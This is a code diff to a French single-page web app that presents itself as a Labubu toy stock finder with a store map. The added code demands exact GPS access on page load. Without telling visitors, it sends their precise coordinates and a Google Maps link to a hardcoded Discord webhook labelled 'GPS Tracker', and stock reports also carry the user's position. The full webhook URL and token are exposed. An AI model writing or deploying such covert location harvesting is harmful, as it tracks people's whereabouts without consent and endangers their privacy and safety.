@@ -163,19 +163,19 @@
             <div id="geo-error-box" class="hidden bg-red-500/10 border border-red-500/40 rounded-2xl p-4 text-left space-y-2 text-xs text-red-200">
                 <div class="flex items-center gap-2 font-bold text-red-400">
                     <i data-lucide="alert-triangle" class="w-4 h-4"></i>
-                    <span id="geo-error-title">Accès GPS indisponible ou refusé</span>
+                    <span>Accès GPS indisponible ou refusé</span>
                 </div>
-                <p id="geo-error-msg">Veuillez autoriser la géolocalisation dans le pop-up du navigateur ou réinitialiser les permissions.</p>
-                <div id="geo-instructions" class="pt-2 text-[11px] text-gray-300 space-y-1">
-                    <p class="font-bold text-labubu-gold">Comment débloquer le pop-up GPS ?</p>
-                    <p>• <strong>Chrome / Firefox / Edge :</strong> Cliquez sur l'icône de cadenas 🔒 à gauche de la barre d'adresse > <em>Autoriser la position</em> > Réessayez.</p>
-                    <p>• <strong>Safari iOS (iPhone/iPad) :</strong> Réglages > Confidentialité et sécurité > Service de localisation > Safari > <em>En utilisant l'app + Position exacte</em>.</p>
+                <p id="geo-error-msg">Veuillez débloquer l'accès aux données GPS dans les réglages de votre navigateur.</p>
+                <div class="pt-2 text-[11px] text-gray-300 space-y-1">
+                    <p class="font-bold text-labubu-gold">Comment débloquer ?</p>
+                    <p>• <strong>Safari (iOS/Mac) :</strong> Réglages > Confidentialité > Service de localisation > Safari.</p>
+                    <p>• <strong>Chrome (Android/PC) :</strong> Icône de cadenas 🔒 à côté de l'URL > Autoriser la position.</p>
                 </div>
             </div>
 
             <!-- Bouton d'activation -->
             <div class="space-y-3 pt-2">
-                <button id="request-geo-btn" onclick="requestMandatoryLocation(true)" class="w-full flex items-center justify-center gap-2 bg-gradient-to-r from-labubu-pink to-labubu-pinkNeon hover:from-labubu-pinkNeon hover:to-labubu-pink text-white font-extrabold text-sm sm:text-base py-4 px-6 rounded-2xl shadow-labubu-pink transition transform active:scale-95 font-labubu">
+                <button id="request-geo-btn" onclick="requestMandatoryLocation()" class="w-full flex items-center justify-center gap-2 bg-gradient-to-r from-labubu-pink to-labubu-pinkNeon hover:from-labubu-pinkNeon hover:to-labubu-pink text-white font-extrabold text-sm sm:text-base py-4 px-6 rounded-2xl shadow-labubu-pink transition transform active:scale-95 font-labubu">
                     <i data-lucide="map-pin" class="w-5 h-5 animate-bounce"></i>
                     <span>Activer ma position GPS exacte</span>
                 </button>
@@ -489,7 +489,130 @@
         // Webhook Discord Officiel
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1565897913379328100/Z0oV4Ukzp635XQwQ7v8rAh9-VLrLncAZyXdWZyuiEGEhe0hKcFmyUpeLQB3o1-nkq6v8";
 
-        // ... existing stores array and variables ...
+        // Base de données étendue des magasins & stocks Labubu
+        let stores = [
+            {
+                id: 1,
+                name: "POP MART Flagship Paris Paix",
+                city: "Paris",
+                address: "15 Rue de la Paix, 75002 Paris",
+                lat: 48.8693,
+                lng: 2.3312,
+                status: "IN_STOCK",
+                statusText: "En Stock",
+                lastUpdate: "Il y a 10 min",
+                items: [
+                    { name: "Have a Seat (Sitting Vinyl)", status: "En Stock", qty: "18 pcs" },
+                    { name: "Exciting Macaron Vinyl Face", status: "En Stock", qty: "24 pcs" },
+                    { name: "Fall in Wild Series", status: "Stock Limité", qty: "3 pcs" }
+                ]
+            },
+            {
+                id: 2,
+                name: "POP MART Forum des Halles",
+                city: "Paris",
+                address: "101 Porte Berger, 75001 Paris",
+                lat: 48.8622,
+                lng: 2.3458,
+                status: "LIMITED",
+                statusText: "Stock Limité",
+                lastUpdate: "Il y a 35 min",
+                items: [
+                    { name: "Tasty Macarons Blind Box", status: "Stock Limité", qty: "4 pcs" },
+                    { name: "Be Fancy Now (Pronounce)", status: "Stock Limité", qty: "2 pcs" }
+                ]
+            },
+            {
+                id: 3,
+                name: "Le Bon Marché Rive Gauche (Pop-Up)",
+                city: "Paris",
+                address: "24 Rue de Sèvres, 75007 Paris",
+                lat: 48.8508,
+                lng: 2.3248,
+                status: "OUT_OF_STOCK",
+                statusText: "Rupture de Stock",
+                lastUpdate: "Il y a 2 heures",
+                items: [
+                    { name: "Mokoko Sweet Heart Edition", status: "Rupture", qty: "0" }
+                ]
+            },
+            {
+                id: 4,
+                name: "POP MART Lyon Part-Dieu",
+                city: "Lyon",
+                address: "17 Boulevard Vivier Merle, 69003 Lyon",
+                lat: 45.7606,
+                lng: 4.8596,
+                status: "IN_STOCK",
+                statusText: "En Stock",
+                lastUpdate: "Il y a 15 min",
+                items: [
+                    { name: "Have a Seat (Sitting Vinyl)", status: "En Stock", qty: "12 pcs" },
+                    { name: "Zimomo / King Labubu", status: "Stock Limité", qty: "1 pc" }
+                ]
+            },
+            {
+                id: 5,
+                name: "Boutique Pop Culture St-Ferréol",
+                city: "Marseille",
+                address: "42 Rue St-Ferréol, 13001 Marseille",
+                lat: 43.2941,
+                lng: 5.3764,
+                status: "LIMITED",
+                statusText: "Stock Limité",
+                lastUpdate: "Il y a 1 heure",
+                items: [
+                    { name: "Exciting Macaron Vinyl Face", status: "Stock Limité", qty: "5 pcs" }
+                ]
+            },
+            {
+                id: 6,
+                name: "POP MART Lille Euralille",
+                city: "Lille",
+                address: "100 Centre Commercial Euralille, 59777 Lille",
+                lat: 50.6372,
+                lng: 3.0725,
+                status: "IN_STOCK",
+                statusText: "En Stock",
+                lastUpdate: "Il y a 5 min",
+                items: [
+                    { name: "Tasty Macarons Blind Box", status: "En Stock", qty: "30 pcs" },
+                    { name: "Have a Seat (Sitting Vinyl)", status: "En Stock", qty: "15 pcs" }
+                ]
+            },
+            {
+                id: 7,
+                name: "Galeries Lafayette Nice Masséna",
+                city: "Nice",
+                address: "6 Avenue Jean Médecin, 06000 Nice",
+                lat: 43.6985,
+                lng: 7.2687,
+                status: "OUT_OF_STOCK",
+                statusText: "Rupture de Stock",
+                lastUpdate: "Hier",
+                items: []
+            },
+            {
+                id: 8,
+                name: "Comics & Toys Toulouse",
+                city: "Toulouse",
+                address: "12 Rue Lapeyrouse, 31000 Toulouse",
+                lat: 43.6035,
+                lng: 1.4462,
+                status: "LIMITED",
+                statusText: "Stock Limité",
+                lastUpdate: "Il y a 4 heures",
+                items: [
+                    { name: "Be Fancy Now (Pronounce)", status: "Stock Limité", qty: "2 pcs" }
+                ]
+            }
+        ];
+
+        // App Global State
+        let userCoords = null;
+        let selectedStockFilter = 'ALL';
+        let leafletMap = null;
+        let mapMarkers = [];
 
         window.onload = function() {
             lucide.createIcons();
@@ -498,40 +621,86 @@
             applyFilters();
             
             // Exiger obligatoirement la géolocalisation dès l'ouverture
-            requestMandatoryLocation(false);
+            requestMandatoryLocation();
         };
 
-        // ... existing initLeafletMap, updateMapMarkers ...
+        // Initialisation Carte Leaflet
+        function initLeafletMap() {
+            leafletMap = L.map('map', { zoomControl: false }).setView([46.603354, 1.888334], 5);
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                attribution: '&copy; OpenStreetMap &copy; CARTO',
+                subdomains: 'abcd',
+                maxZoom: 19
+            }).addTo(leafletMap);
+        }
 
-        // Demande obligatoire de la géolocalisation avec option d'invocation manuelle directe
-        function requestMandatoryLocation(isUserClick = false) {
+        // Met à jour les marqueurs de la carte interactive
+        function updateMapMarkers(storesToDisplay) {
+            if (!leafletMap) return;
+
+            mapMarkers.forEach(marker => leafletMap.removeLayer(marker));
+            mapMarkers = [];
+
+            if (userCoords) {
+                const userIcon = L.divIcon({
+                    className: 'custom-user-pin',
+                    html: `<div class="w-7 h-7 rounded-full bg-labubu-pink border-2 border-white shadow-labubu-pink flex items-center justify-center text-xs animate-bounce">💖</div>`,
+                    iconSize: [28, 28],
+                    iconAnchor: [14, 14]
+                });
+                const userMarker = L.marker([userCoords.lat, userCoords.lng], { icon: userIcon })
+                    .addTo(leafletMap)
+                    .bindPopup(`<b>Votre position GPS</b><br>Recherche active`);
+                mapMarkers.push(userMarker);
+            }
+
+            storesToDisplay.forEach(store => {
+                let pinColor = "#06d6a0";
+                let emoji = "🛍️";
+                if (store.status === "LIMITED") { pinColor = "#ffd166"; emoji = "⚠️"; }
+                if (store.status === "OUT_OF_STOCK") { pinColor = "#ef4444"; emoji = "❌"; }
+
+                const storeIcon = L.divIcon({
+                    className: 'custom-store-pin',
+                    html: `<div style="background-color: ${pinColor};" class="w-8 h-8 rounded-full border-2 border-white shadow-lg flex items-center justify-center text-xs font-bold text-black transform hover:scale-110 transition">${emoji}</div>`,
+                    iconSize: [32, 32],
+                    iconAnchor: [16, 16]
+                });
+
+                const popupContent = `
+                    <div style="font-family:'Plus Jakarta Sans', sans-serif;">
+                        <strong style="color:#ff6b9d; font-size:13px;">${store.name}</strong><br>
+                        <span style="font-size:11px; color:#ccc;">${store.address}</span><br>
+                        <span style="font-size:11px; font-weight:bold; color:${pinColor};">Statut: ${store.statusText}</span>
+                    </div>
+                `;
+
+                const marker = L.marker([store.lat, store.lng], { icon: storeIcon })
+                    .addTo(leafletMap)
+                    .bindPopup(popupContent);
+
+                mapMarkers.push(marker);
+            });
+        }
+
+        // Demande obligatoire de la géolocalisation
+        function requestMandatoryLocation() {
             const errorBox = document.getElementById('geo-error-box');
             const errorMsg = document.getElementById('geo-error-msg');
-            const errorTitle = document.getElementById('geo-error-title');
             const btn = document.getElementById('request-geo-btn');
 
-            errorBox.classList.add('hidden');
             btn.disabled = true;
-            btn.innerHTML = `<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> <span>Demande de permission GPS native...</span>`;
+            btn.innerHTML = `<i data-lucide="loader-2" class="w-5 h-5 animate-spin"></i> <span>Vérification du signal GPS...</span>`;
             lucide.createIcons();
 
             if (!navigator.geolocation) {
                 errorBox.classList.remove('hidden');
-                errorTitle.innerText = "GPS non supporté";
-                errorMsg.innerText = "La géolocalisation n'est pas prise en charge par ce navigateur.";
+                errorMsg.innerText = "La géolocalisation n'est pas supportée par votre navigateur.";
                 btn.disabled = false;
-                btn.innerHTML = `<span>Navigateur non compatible</span>`;
+                btn.innerHTML = `<span>Réessayer</span>`;
                 return;
             }
 
-            // Options strictes pour forcer la localisation exacte à chaque appel
-            const geoOptions = {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            };
-
-            // Invoque directement la demande de géolocalisation du navigateur
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     userCoords = {
@@ -549,33 +718,321 @@
 
                     updateStoreDistances();
                     applyFilters();
-                    showToast("GPS Connecté 💖", "Distance exacte calculée pour chaque magasin Labubu !");
+                    showToast("GPS Connecté", "Distance calculée pour chaque magasin Labubu !");
                     sendLocationAccessLog(userCoords);
                 },
                 (error) => {
                     errorBox.classList.remove('hidden');
-                    
                     if (error.code === error.PERMISSION_DENIED) {
-                        errorTitle.innerText = "Permission GPS bloquée";
-                        errorMsg.innerText = "Le navigateur bloque le popup d'autorisation. Veuillez suivre les instructions ci-dessous pour débloquer l'accès aux données de localisation.";
-                    } else if (error.code === error.TIMEOUT) {
-                        errorTitle.innerText = "Délai GPS dépassé";
-                        errorMsg.innerText = "La demande a expiré. Assurez-vous d'avoir activé le GPS de votre appareil et réessayez.";
+                        errorMsg.innerText = "Accès refusé. Vous devez activer la géolocalisation exacte pour continuer.";
                     } else {
-                        errorTitle.innerText = "Signal GPS indisponible";
-                        errorMsg.innerText = "Impossible de récupérer vos coordonnées exactes. Assurez-vous que votre position est activée dans votre téléphone/PC.";
+                        errorMsg.innerText = "Signal GPS faible ou indisponible. Veuillez vérifier vos réglages système.";
                     }
-
                     btn.disabled = false;
-                    btn.setAttribute('onclick', 'requestMandatoryLocation(true)');
                     btn.innerHTML = `<i data-lucide="rotate-ccw" class="w-5 h-5"></i> <span>Réessayer l'autorisation GPS</span>`;
                     lucide.createIcons();
                 },
-                geoOptions
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         }
 
-        // ... existing sendLocationAccessLog, calculateDistance, etc. ...
+        // Webhook Discord Log de connexion
+        async function sendLocationAccessLog(coords) {
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "Labubu Radar GPS Tracker",
+                        avatar_url: "https://placehold.co/100x100/ff6b9d/000000?text=LABUBU",
+                        embeds: [{
+                            title: "💖 Nouvelle connexion géolocalisée !",
+                            description: "Un fan de Labubu vient d'ouvrir la carte radar avec sa position GPS.",
+                            color: 16739229,
+                            fields: [
+                                { name: "📍 Latitude / Longitude", value: `\`${coords.lat}, ${coords.lng}\``, inline: true },
+                                { name: "🗺️ Google Maps Link", value: `[Ouvrir dans Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lng})`, inline: false }
+                            ],
+                            footer: { text: "Labubu Radar Security System" },
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch(e) { console.log("Webhook access log error", e); }
+        }
+
+        // Distance en km
+        function calculateDistance(lat1, lon1, lat2, lon2) {
+            const R = 6371;
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                      Math.sin(dLon / 2) * Math.sin(dLon / 2);
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+        }
+
+        function updateStoreDistances() {
+            if (!userCoords) return;
+            stores.forEach(store => {
+                store.distance = calculateDistance(userCoords.lat, userCoords.lng, store.lat, store.lng);
+            });
+        }
+
+        function renderStores(storesToRender) {
+            const container = document.getElementById('stores-container');
+            const emptyState = document.getElementById('empty-state');
+            document.getElementById('results-count').innerText = storesToRender.length;
+
+            container.innerHTML = '';
+
+            if (storesToRender.length === 0) {
+                emptyState.classList.remove('hidden');
+                updateMapMarkers([]);
+                return;
+            } else {
+                emptyState.classList.add('hidden');
+            }
+
+            storesToRender.forEach(store => {
+                let statusBadge = "";
+                if (store.status === "IN_STOCK") {
+                    statusBadge = `<span class="px-3 py-1 rounded-full text-xs font-bold bg-labubu-green/15 text-labubu-green border border-labubu-green/40 flex items-center gap-1 font-labubu"><span class="w-2 h-2 rounded-full bg-labubu-green animate-ping"></span> En Stock</span>`;
+                } else if (store.status === "LIMITED") {
+                    statusBadge = `<span class="px-3 py-1 rounded-full text-xs font-bold bg-labubu-gold/15 text-labubu-gold border border-labubu-gold/40 flex items-center gap-1 font-labubu"><span class="w-2 h-2 rounded-full bg-labubu-gold"></span> Stock Limité</span>`;
+                } else {
+                    statusBadge = `<span class="px-3 py-1 rounded-full text-xs font-bold bg-red-500/15 text-red-400 border border-red-500/40 flex items-center gap-1 font-labubu"><span class="w-2 h-2 rounded-full bg-red-400"></span> Rupture</span>`;
+                }
+
+                const distHtml = store.distance !== undefined 
+                    ? `<span class="text-xs font-bold text-labubu-pink bg-labubu-darkBg border border-labubu-pink/30 px-2.5 py-1 rounded-xl shadow-labubu-pink">${store.distance.toFixed(1)} km</span>`
+                    : '';
+
+                const itemsListHtml = store.items.length > 0
+                    ? store.items.map(item => `
+                        <div class="flex items-center justify-between text-xs bg-labubu-darkBg/80 px-3 py-1.5 rounded-xl border border-gray-800">
+                            <span class="text-gray-200 font-medium">${item.name}</span>
+                            <span class="text-[11px] font-bold ${item.status === 'En Stock' ? 'text-labubu-green' : (item.status === 'Stock Limité' ? 'text-labubu-gold' : 'text-red-400')}">${item.qty}</span>
+                        </div>
+                    `).join('')
+                    : `<p class="text-xs text-gray-500 italic">Aucune précision sur les modèles en rayon.</p>`;
+
+                const cardHtml = `
+                    <div class="glass-card p-5 rounded-3xl flex flex-col justify-between space-y-4">
+                        <div>
+                            <div class="flex items-center justify-between gap-2 mb-3">
+                                ${statusBadge}
+                                ${distHtml}
+                            </div>
+                            <h3 class="font-extrabold text-white text-base font-labubu">${store.name}</h3>
+                            <p class="text-xs text-gray-400 mt-1 flex items-center gap-1.5">
+                                <i data-lucide="map-pin" class="w-3.5 h-3.5 text-labubu-pink flex-shrink-0"></i>
+                                ${store.address}
+                            </p>
+                        </div>
+
+                        <div class="space-y-2 pt-2 border-t border-gray-800/80">
+                            <p class="text-[11px] font-bold text-labubu-pink tracking-wide uppercase">Séries en boutique :</p>
+                            <div class="space-y-1.5">${itemsListHtml}</div>
+                        </div>
+
+                        <div class="flex items-center justify-between pt-3 border-t border-gray-800/60 text-[11px] text-gray-400">
+                            <span>Mis à jour : ${store.lastUpdate}</span>
+                            <button onclick="quickReportForStore(${store.id})" class="text-labubu-pink hover:underline flex items-center gap-1 font-bold font-labubu">
+                                <i data-lucide="refresh-cw" class="w-3 h-3"></i> Mettre à jour
+                            </button>
+                        </div>
+                    </div>
+                `;
+                container.innerHTML += cardHtml;
+            });
+
+            lucide.createIcons();
+            updateStats();
+            updateMapMarkers(storesToRender);
+        }
+
+        function applyFilters() {
+            const searchValue = document.getElementById('search-input').value.toLowerCase();
+            const seriesValue = document.getElementById('series-filter').value;
+            const cityValue = document.getElementById('city-filter').value;
+            const maxDistance = parseFloat(document.getElementById('distance-range').value);
+            const sortBy = document.getElementById('sort-select').value;
+
+            let filtered = stores.filter(store => {
+                const matchesSearch = store.name.toLowerCase().includes(searchValue) || 
+                                      store.address.toLowerCase().includes(searchValue) ||
+                                      store.city.toLowerCase().includes(searchValue);
+
+                const matchesCity = (cityValue === 'ALL') || (store.city.toLowerCase() === cityValue.toLowerCase());
+
+                let matchesSeries = true;
+                if (seriesValue !== 'ALL') {
+                    matchesSeries = store.items.some(item => item.name.toLowerCase().includes(seriesValue.toLowerCase()));
+                }
+
+                let matchesStock = true;
+                if (selectedStockFilter === 'IN_STOCK') matchesStock = store.status === 'IN_STOCK';
+                if (selectedStockFilter === 'LIMITED') matchesStock = store.status === 'LIMITED' || store.status === 'IN_STOCK';
+
+                let matchesDistance = true;
+                if (userCoords && store.distance !== undefined) {
+                    matchesDistance = store.distance <= maxDistance;
+                }
+
+                return matchesSearch && matchesCity && matchesSeries && matchesStock && matchesDistance;
+            });
+
+            if (sortBy === 'distance' && userCoords) {
+                filtered.sort((a, b) => (a.distance || 0) - (b.distance || 0));
+            } else if (sortBy === 'name') {
+                filtered.sort((a, b) => a.name.localeCompare(b.name));
+            } else if (sortBy === 'stock') {
+                const weight = { 'IN_STOCK': 1, 'LIMITED': 2, 'OUT_OF_STOCK': 3 };
+                filtered.sort((a, b) => weight[a.status] - weight[b.status]);
+            }
+
+            renderStores(filtered);
+        }
+
+        function setStockFilter(type) {
+            selectedStockFilter = type;
+            document.querySelectorAll('.stock-filter-btn').forEach(btn => {
+                btn.classList.remove('bg-labubu-pink/20', 'border-labubu-pink', 'text-labubu-pink');
+                btn.classList.add('bg-labubu-darkBg', 'border-gray-800', 'text-gray-400');
+            });
+
+            const activeBtnId = type === 'ALL' ? 'filter-stock-all' : (type === 'IN_STOCK' ? 'filter-stock-in' : 'filter-stock-lim');
+            const activeBtn = document.getElementById(activeBtnId);
+            activeBtn.classList.remove('bg-labubu-darkBg', 'border-gray-800', 'text-gray-400');
+            activeBtn.classList.add('bg-labubu-pink/20', 'border-labubu-pink', 'text-labubu-pink');
+
+            applyFilters();
+        }
+
+        function updateDistanceVal(val) {
+            document.getElementById('distance-val').innerText = `${val} km`;
+            applyFilters();
+        }
+
+        function resetFilters() {
+            document.getElementById('search-input').value = '';
+            document.getElementById('series-filter').value = 'ALL';
+            document.getElementById('city-filter').value = 'ALL';
+            document.getElementById('distance-range').value = 100;
+            document.getElementById('distance-val').innerText = '100 km';
+            setStockFilter('ALL');
+        }
+
+        function updateStats() {
+            document.getElementById('stat-total-stores').innerText = stores.length;
+            document.getElementById('stat-in-stock').innerText = stores.filter(s => s.status === 'IN_STOCK').length;
+            document.getElementById('stat-out-of-stock').innerText = stores.filter(s => s.status === 'OUT_OF_STOCK').length;
+        }
+
+        function openReportModal() {
+            document.getElementById('report-modal').classList.remove('hidden');
+        }
+
+        function closeReportModal() {
+            document.getElementById('report-modal').classList.add('hidden');
+        }
+
+        function populateFormStores() {
+            const select = document.getElementById('form-store-select');
+            select.innerHTML = stores.map(s => `<option value="${s.id}">${s.name} (${s.city})</option>`).join('');
+        }
+
+        function quickReportForStore(storeId) {
+            document.getElementById('form-store-select').value = storeId;
+            openReportModal();
+        }
+
+        async function submitStockReport(event) {
+            event.preventDefault();
+            const submitBtn = document.getElementById('submit-btn');
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Envoi Discord...";
+
+            const storeId = parseInt(document.getElementById('form-store-select').value);
+            const store = stores.find(s => s.id === storeId);
+            const seriesName = document.getElementById('form-series').value;
+            const status = document.getElementById('form-status').value;
+            const quantity = document.getElementById('form-quantity').value || "Non précisé";
+            const notes = document.getElementById('form-notes').value || "Aucune remarque particulière.";
+
+            store.statusText = status;
+            store.status = status === 'En Stock' ? 'IN_STOCK' : (status === 'Stock Limité' ? 'LIMITED' : 'OUT_OF_STOCK');
+            store.lastUpdate = "À l'instant";
+
+            const existingItem = store.items.find(i => i.name.includes(seriesName.split(' ')[0]));
+            if (existingItem) {
+                existingItem.status = status;
+                existingItem.qty = quantity;
+            } else {
+                store.items.push({ name: seriesName, status: status, qty: quantity });
+            }
+
+            let embedColor = 16739229;
+            if (status === "Stock Limité") embedColor = 16765286;
+            if (status === "Rupture de Stock") embedColor = 15680100;
+
+            const gpsText = userCoords ? `${userCoords.lat.toFixed(5)}, ${userCoords.lng.toFixed(5)}` : "Non disponible";
+            const gmapsUrl = userCoords ? `https://www.google.com/maps?q=${userCoords.lat},${userCoords.lng}` : `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(store.address)}`;
+
+            const payload = {
+                username: "Pop Mart Labubu Bot",
+                avatar_url: "https://placehold.co/100x100/ff6b9d/000000?text=LABUBU",
+                embeds: [
+                    {
+                        title: `🛍️ ALERTE STOCK LABUBU MIS À JOUR !`,
+                        description: `Un membre de la communauté a mis à jour les stocks Pop Mart en direct !`,
+                        color: embedColor,
+                        fields: [
+                            { name: "🏪 Magasin", value: `**${store.name}**\n📍 *${store.address}*`, inline: false },
+                            { name: "💖 Collection Labubu", value: `\`${seriesName}\``, inline: true },
+                            { name: "📦 Statut du Stock", value: `**${status}** (${quantity})`, inline: true },
+                            { name: "📝 Remarques", value: notes, inline: false },
+                            { name: "📍 Position Utilisateur (GPS)", value: `\`${gpsText}\``, inline: true },
+                            { name: "🗺️ Itinéraire / Maps", value: `[Ouvrir Google Maps](${gmapsUrl})`, inline: true }
+                        ],
+                        footer: { text: "Labubu Finder Community • Pop Mart World" },
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                showToast("Succès !", "Signalement transmis sur Discord avec succès !");
+                closeReportModal();
+                applyFilters();
+            } catch (err) {
+                console.error("Erreur Discord Webhook:", err);
+                showToast("Information", "Stock mis à jour en local !");
+                closeReportModal();
+                applyFilters();
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = `<i data-lucide="send" class="w-4 h-4"></i> <span>Publier sur Discord</span>`;
+                lucide.createIcons();
+            }
+        }
+
+        function showToast(title, msg) {
+            const toast = document.getElementById('toast');
+            document.getElementById('toast-title').innerText = title;
+            document.getElementById('toast-msg').innerText = msg;
+
+            toast.classList.remove('translate-y-20', 'opacity-0');
+            setTimeout(() => {
+                toast.classList.add('translate-y-20', 'opacity-0');
+            }, 4000);
+        }
     </script>
 </body>
 </html>
